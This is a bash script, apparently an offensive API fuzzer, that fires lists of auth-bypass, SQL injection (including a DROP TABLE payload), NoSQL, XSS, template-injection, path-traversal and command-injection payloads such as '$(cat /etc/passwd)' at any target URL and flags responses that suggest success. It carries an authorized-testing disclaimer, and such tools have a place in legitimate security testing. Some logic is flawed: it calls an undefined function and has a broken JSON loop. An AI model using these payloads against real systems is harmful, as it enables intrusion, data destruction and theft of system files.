#!/bin/bash

# API Fuzzer
# REST API fuzzing with common bug patterns — auth bypass, IDOR, injection, mass assignment
# Usage: ./api_fuzz.sh <base_url> [-m method] [-f param_file] [-o output_dir] [-j]
# Requires: curl, jq, ffuf (optional)
# Disclaimer: For authorized testing only

set -euo pipefail

BASE_URL="${1:-}"
METHOD="${2:-GET}"
OUTPUT_DIR=""
JSON_OUTPUT=false
AUTH_BEARER=""
AUTH_API_KEY=""
HEADERS_FILE=""
PAYLOAD_FILE=""
TIMEOUT=15

RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' BLUE='\033[0;34m' CYAN='\033[0;36m' NC='\033[0m'
log()   { echo -e "${BLUE}[$(date '+%Y-%m-%d %H:%M:%S')] $1${NC}"; }
warn()  { echo -e "${YELLOW}[-] $1${NC}"; }
found() { echo -e "${GREEN}[✓] $1${NC}"; }
fail()  { echo -e "${RED}[!] $1${NC}"; }

usage() {
    head -4 "$0" | cut -c4-
    echo ""
    echo "Options:"
    echo "  -m, --method METHOD     HTTP method: GET POST PUT DELETE PATCH (default: GET)"
    echo "  -a, --authBearer TOKEN Bearer token for auth"
    echo "  -k, --apiKey KEY        API key header"
    echo "  -H, --headers FILE      File with custom headers (KEY:VALUE format)"
    echo "  -p, --payloads FILE     Custom payloads file"
    echo "  -o, --output DIR        Output directory"
    echo "  -j, --json             JSON output"
    echo "  -t, --timeout SECS     Request timeout (default: 15)"
    echo "  -h, --help             Show this help"
    echo ""
    echo "Example:"
    echo "  $0 https://api.example.com/v1 -m GET -a eyJ... -j"
    echo "  $0 https://api.target.com/users -m POST -H headers.txt -p sqli_payloads.txt"
    exit 1
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -m|--method) METHOD="$2"; shift 2 ;;
        -a|--authBearer) AUTH_BEARER="$2"; shift 2 ;;
        -k|--apiKey) AUTH_API_KEY="$2"; shift 2 ;;
        -H|--headers) HEADERS_FILE="$2"; shift 2 ;;
        -p|--payloads) PAYLOAD_FILE="$2"; shift 2 ;;
        -o|--output) OUTPUT_DIR="$2"; shift 2 ;;
        -j|--json) JSON_OUTPUT=true; shift ;;
        -t|--timeout) TIMEOUT="$2"; shift 2 ;;
        -h|--help) usage ;;
        *) BASE_URL="$1"; shift ;;
    esac
done

[[ -z "$BASE_URL" ]] && usage

SAFE_NAME=$(echo "$BASE_URL" | sed 's/https\?:\/\///; s/[\/:.]/_/g' | head -c 40)
[[ -z "$OUTPUT_DIR" ]] && OUTPUT_DIR="api_fuzz_${SAFE_NAME}_$(date +%Y-%m-%d)"
mkdir -p "$OUTPUT_DIR"

LOG_FILE="$OUTPUT_DIR/fuzz.log"
RESULTS_FILE="$OUTPUT_DIR/findings.txt"
JSON_FILE="$OUTPUT_DIR/results.json"
REQ_LOG="$OUTPUT_DIR/requests.log"

log "Starting API fuzz → $BASE_URL ($METHOD)"

# ─── Build auth headers ───
declare -A REQUEST_HEADERS=(
    ["Content-Type"]="application/json"
    ["Accept"]="application/json"
    ["User-Agent"]="Mozilla/5.0 (compatible; API-Fuzzer/1.0)"
)

[[ -n "$AUTH_BEARER" ]] && REQUEST_HEADERS["Authorization"]="Bearer $AUTH_BEARER"
[[ -n "$AUTH_API_KEY" ]] && REQUEST_HEADERS["X-API-Key"]="$AUTH_API_KEY"

# Load custom headers
if [[ -n "$HEADERS_FILE" && -f "$HEADERS_FILE" ]]; then
    while IFS=':' read -r key value; do
        [[ -z "$key" || "$key" =~ ^# ]] && continue
        key=$(echo "$key" | xargs)
        value=$(echo "$value" | xargs)
        REQUEST_HEADERS["$key"]="$value"
    done < "$HEADERS_FILE"
fi

build_curl_headers() {
    for key in "${!REQUEST_HEADERS[@]}"; do
        echo -n "-H '$key: ${REQUEST_HEADERS[$key]}' "
    done
}

# ═══════════════════════════════════════════════════════════
# Payloads
# ═══════════════════════════════════════════════════════════

AUTH_BYPASS=(
    "' or '1'='1"
    "' or '1'='1' --"
    "' or '1'='1' #"
    "' or '1'='1'/*"
    "admin' or '1'='1"
    "admin' --"
    "' or ''='"
    "' or 'a'='a"
    "' or 1=1 --"
    "1' OR '1'='1"
    "1 OR 1=1"
    "1' OR '1'='1'--"
    "nope' OR 1=1--"
    "admin' OR '1'='1'--"
    "' OR '1'='1'/*"
)

IDOR_PAYLOADS=(
    "../" "../../" "../../../" "../../../../" "../../../../../"
    "..\\..\\..\\..\\..\\"
    "%2e%2e%2f" "%2e%2e%2f%2e%2e%2f" "%2e%2e/" "%252e%252e%252f"
    "....//....//....//....//"
    "%2e%2e%5c" "..%5c..%5c"
    "....\/....\/....\/....\/"
)

SQLI_PAYLOADS=(
    "'"
    "1' AND '1'='1"
    "1' AND '1'='2"
    "1' ORDER BY 100--"
    "1' GROUP BY 1--"
    "1 UNION SELECT NULL--"
    "1 UNION SELECT 1,2,3--"
    "1' UNION SELECT NULL,NULL,NULL--"
    "' OR 1=1--"
    "1; DROP TABLE users--"
    "1' WAITFOR DELAY '0:0:5'--"
    "1' AND SLEEP(5)--"
    "1' AND (SELECT COUNT(*) FROM users)>0--"
    "' OR 1=1 LIMIT 1--"
    "1' OR '1'='1' ORDER BY 1--"
)

XSS_PAYLOADS=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "<svg onload=alert(1)>"
    "javascript:alert(1)"
    "<body onload=alert(1)>"
    "<iframe src='javascript:alert(1)'>"
    "'><script>alert(String.fromCharCode(49))</script>"
    "\"><script>alert(1)</script>"
    "<scr<script>ipt>alert(1)</scr</script>ipt>"
)

SSTI_PAYLOADS=(
    "{{7*7}}"
    "{{7*'7'}}"
    "${7*7}"
    "#{7*7}"
    "{{config}}"
    "{{session}}"
    "{{request}}"
    "{{.Payment.Form}}"
    "${project.name}"
    '{{7*7}}.toString()'
    "{% for c in [1,2,3] %}{{ c }}{% endfor %}"
    "{{''.__class__.__mro__[1].__subclasses__()}}"
)

NOSQL_PAYLOADS=(
    "' || '1'=='1"
    "' || 1==1 --"
    "1; return true"
    "'); return true"
    "{\"$gt\": \"\"}"
    "{\"$ne\": null}"
    "{\"$regex\": \".*\"}"
    "1 || 1==1"
    "admin' || '1'=='1"
)

COMMAND_INJECTION=(
    "$(whoami)"
    "{{7*7}}"
    "${IFS}"
    "; whoami"
    "| whoami"
    "&& whoami"
    "|| whoami"
    "whoami"
    "`whoami`"
    "$(cat /etc/passwd)"
)

# Load custom payloads if provided
CUSTOM_PAYLOADS=()
if [[ -n "$PAYLOAD_FILE" && -f "$PAYLOAD_FILE" ]]; then
    while IFS= read -r line; do
        [[ -z "$line" || "$line" =~ ^# ]] && continue
        CUSTOM_PAYLOADS+=("$line")
    done < "$PAYLOAD_FILE"
fi

# ═══════════════════════════════════════════════════════════
# Fuzz function
# ═══════════════════════════════════════════════════════════
FINDING_COUNT=0
TOTAL_REQUESTS=0

fuzz() {
    local param="$1"
    local category="$2"
    local -a payloads=("${!3}")

    for payload in "${payloads[@]}"; do
        ((TOTAL_REQUESTS++))
        encoded_payload=$(echo "$payload" | jq -Rs '.' | sed 's/^"//; s/"$//' | sed 's/\\/%20/g; s/"/%22/g; s/'\''/%27/g')

        case "$METHOD" in
            GET)
                if [[ "$param" == *"?"* ]]; then
                    test_url="${BASE_URL}&${param}=${encoded_payload}"
                else
                    test_url="${BASE_URL}?${param}=${encoded_payload}"
                fi
                response=$(curl -s -w "\nHTTP_CODE:%{http_code}" --max-time "$TIMEOUT" \
                    $(build_curl_headers) "$test_url" 2>/dev/null || echo "ERROR")
                ;;
            POST)
                body="{\"${param}\": \"${payload}\"}"
                response=$(curl -s -w "\nHTTP_CODE:%{http_code}" --max-time "$TIMEOUT" \
                    $(build_curl_headers) -d "$body" "$BASE_URL" 2>/dev/null || echo "ERROR")
                ;;
            PUT|PATCH)
                body="{\"${param}\": \"${payload}\"}"
                response=$(curl -s -w "\nHTTP_CODE:%{http_code}" --max-time "$TIMEOUT" \
                    -X "$METHOD" $(build_curl_headers) -d "$body" "$BASE_URL" 2>/dev/null || echo "ERROR")
                ;;
            DELETE)
                response=$(curl -s -w "\nHTTP_CODE:%{http_code}" --max-time "$TIMEOUT" \
                    -X DELETE $(build_curl_headers) "$BASE_URL" 2>/dev/null || echo "ERROR")
                ;;
        esac

        http_code=$(echo "$response" | grep "HTTP_CODE:" | sed 's/HTTP_CODE://')
        body=$(echo "$response" | sed '/HTTP_CODE:/d')

        # Log request
        echo "[$category] $param = $payload → HTTP $http_code" >> "$REQ_LOG"

        # Check for findings
        case "$category" in
            AUTH_BYPASS)
                if echo "$body" | grep -qi "welcome\|dashboard\|admin\|login success\|token\|session\|authenticated"; then
                    [[ ! "$http_code" =~ ^4 ]] && {
                        found "  AUTH BYPASS: $param = $payload → HTTP $http_code"
                        echo "[AUTH_BYPASS] $param=$payload HTTP=$http_code" >> "$RESULTS_FILE"
                        ((FINDING_COUNT++))
                    }
                fi
                if echo "$body" | grep -qi "error\|invalid\|unauthorized\|forbidden" && [[ "$http_code" == "200" ]]; then
                    warn "  AUTH BYPASS (false positive check): $payload → HTTP $http_code (may be filtered)"
                fi
                ;;
            SQLI)
                if echo "$body" | grep -qiE "mysql|postgresql|sqlite|ora-|sql syntax|odbc|sqlstate|unclosed|quoted|error in your sql"; then
                    found "  SQL INJECTION: $param = $payload → HTTP $http_code"
                    echo "[SQLI] $param=$payload HTTP=$http_code" >> "$RESULTS_FILE"
                    ((FINDING_COUNT++))
                fi
                if [[ "$body" =~ timeout || "$body" =~ "500" ]]; then
                    found "  SQLI (error/timeout): $param = $payload → HTTP $http_code"
                    echo "[SQLI_TIMEOUT] $param=$payload HTTP=$http_code" >> "$RESULTS_FILE"
                    ((FINDING_COUNT++))
                fi
                ;;
            IDOR)
                if [[ "$http_code" == "200" || "$http_code" == "201" || "$http_code" == "204" ]]; then
                    if echo "$body" | grep -qiE "admin|dashboard|user|profile|settings|password|email|phone"; then
                        found "  IDOR: $param = $payload → HTTP $http_code"
                        echo "[IDOR] $param=$payload HTTP=$http_code BODY_SNIPPET=$(echo $body | head -c 100)" >> "$RESULTS_FILE"
                        ((FINDING_COUNT++))
                    fi
                fi
                ;;
            XSS)
                if echo "$body" | grep -qi "<script\|onerror\|onload\|javascript:"; then
                    found "  XSS: $param = $payload → HTTP $http_code"
                    echo "[XSS] $param=$payload HTTP=$http_code" >> "$RESULTS_FILE"
                    ((FINDING_COUNT++))
                fi
                ;;
            SSTI)
                if echo "$body" | grep -qi "49\|77\|${7\*7}\|\$\{7"; then
                    found "  SSTI: $param = $payload → HTTP $http_code"
                    echo "[SSTI] $param=$payload HTTP=$http_code" >> "$RESULTS_FILE"
                    ((FINDING_COUNT++))
                fi
                ;;
            NOSQL)
                if echo "$body" | grep -qiE "mongodb|not found|not an error|syntax|json parse|unexpected"; then
                    found "  NoSQL INJECTION: $param = $payload → HTTP $http_code"
                    echo "[NOSQL] $param=$payload HTTP=$http_code" >> "$RESULTS_FILE"
                    ((FINDING_COUNT++))
                fi
                ;;
            COMMAND_INJ)
                if echo "$body" | grep -qiE "root:|daemon:|bin:|etc/passwd|uid=|gid="; then
                    found "  COMMAND INJECTION: $param = $payload → HTTP $http_code"
                    echo "[CMDi] $param=$payload HTTP=$http_code" >> "$RESULTS_FILE"
                    ((FINDING_COUNT++))
                fi
                ;;
        esac
    done
}

# ═══════════════════════════════════════════════════════════
# Scan each category
# ═══════════════════════════════════════════════════════════
log "Fuzzing auth bypass..."
for param in "username" "email" "user" "login" "id" "q" "search" "query" "name" "password" "pass"; do
    fuzz "$param" "AUTH_BYPASS" AUTH_BYPASS[@]
done

log "Fuzzing SQL injection..."
for param in "id" "user_id" "page" "limit" "offset" "sort" "order" "search" "query" "id" "cat" "category" "name" "email"; do
    fuzz "$param" "SQLI" SQLI_PAYLOADS[@]
done

log "Fuzzing NoSQL injection..."
for param in "id" "user" "email" "login" "_id" "filter" "search"; do
    fuzz "$param" "NOSQL" NOSQL_PAYLOADS[@]
done

log "Fuzzing XSS..."
for param in "q" "search" "query" "name" "comment" "text" "message" "title" "body" "content" "desc" "description"; do
    fuzz "$param" "XSS" XSS_PAYLOADS[@]
done

log "Fuzzing SSTI..."
for param in "name" "title" "text" "content" "body" "description" "template" "view" "format" "data"; do
    fuzz "$param" "SSTI" SSTI_PAYLOADS[@]
done

log "Fuzzing IDOR/path traversal..."
for param in "id" "user_id" "file" "path" "page" "doc" "document" "src" "resource" "account"; do
    fuzz "$param" "IDOR" IDOR_PAYLOADS[@]
done

log "Fuzzing command injection..."
for param in "file" "name" "cmd" "command" "exec" "shell" "host" "domain"; do
    fuzz "$param" "COMMAND_INJ" COMMAND_INJECTION[@]
done

# Custom payloads
if [[ ${#CUSTOM_PAYLOADS[@]} -gt 0 ]]; then
    log "Fuzzing custom payloads..."
    for param in "q" "search" "id" "name" "input" "data"; do
        fuzz "$param" "CUSTOM" CUSTOM_PAYLOADS[@]
    done
fi

# ═══════════════════════════════════════════════════════════
# JSON output
# ═══════════════════════════════════════════════════════════
if [[ "$JSON_OUTPUT" == "true" ]]; then
    log "Generating JSON output..."

    {
        echo "{"
        echo "  \"target\": \"$BASE_URL\","
        echo "  \"method\": \"$METHOD\","
        echo "  \"timestamp\": \"$(date -I)\","
        echo "  \"stats\": {"
        echo "    \"total_requests\": $TOTAL_REQUESTS,"
        echo "    \"findings\": $FINDING_COUNT"
        echo "  },"
        echo "  \"findings\": ["
        while IFS='[' read -r line; do
            [[ -z "$line" || "$line" =~ ^HTTP ]] && continue
        done < "$RESULTS_FILE" | while IFS=']' read -r type rest; do
            [[ -z "$type" ]] && continue
            type=$(echo "$type" | tr -d '[]')
            echo "    {\"type\": \"$type\", \"detail\": \"$rest\"},"
        done | sed '$ s/,$//'
        echo "  ]"
        echo "}"
    } > "$JSON_FILE"
fi

# ═══════════════════════════════════════════════════════════
# Summary
# ═══════════════════════════════════════════════════════════
log "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
log "API Fuzz Complete — $BASE_URL"
echo -e "${GREEN}[✓]${NC} Total requests:   $TOTAL_REQUESTS"
echo -e "${YELLOW}[!]${NC} Findings:         $FINDING_COUNT"
echo ""
echo -e "  Findings:  ${YELLOW}$RESULTS_FILE${NC}"
echo -e "  Requests:  ${CYAN}$REQ_LOG${NC}"
echo -e "  JSON:      ${BLUE}$JSON_FILE${NC}"
echo ""

if [[ "$FINDING_COUNT" -gt 0 ]]; then
    info "Review findings in $RESULTS_FILE"
    info "Verify manually before reporting — false positives possible"
fi

log "Fuzz complete — use only with authorization"